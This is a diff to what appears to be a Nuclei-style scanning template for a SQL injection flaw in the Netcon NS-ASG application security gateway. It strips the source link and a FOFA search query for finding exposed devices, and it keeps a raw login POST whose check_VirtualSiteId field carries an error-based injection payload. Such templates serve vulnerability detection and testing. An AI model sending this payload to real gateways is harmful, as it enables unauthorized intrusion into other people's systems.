@@ -3,12 +3,8 @@ info:
   name: 网康应用安全网关(NS-ASG) SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wamkbzcugnxzbh93'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wamkbzcugnxzbh93
-    fofa: title:"网康-NS-ASG-应用安全网关"
 http:
 - raw:
   - 'POST /vpnweb/index.php?para=index HTTP/1.1
@@ -33,8 +29,6 @@ http:
 
 
     Connection: close
-
-
 
 
     check_username=123&check_username1=123&check_passwd=123&action=login_check&check_VirtualSiteId=1/**/and/**/updatexml(1,concat(0x7e,(md5(123))),3)#&imgcode=undefined&selvalue=2&BackgroundName=background.gif
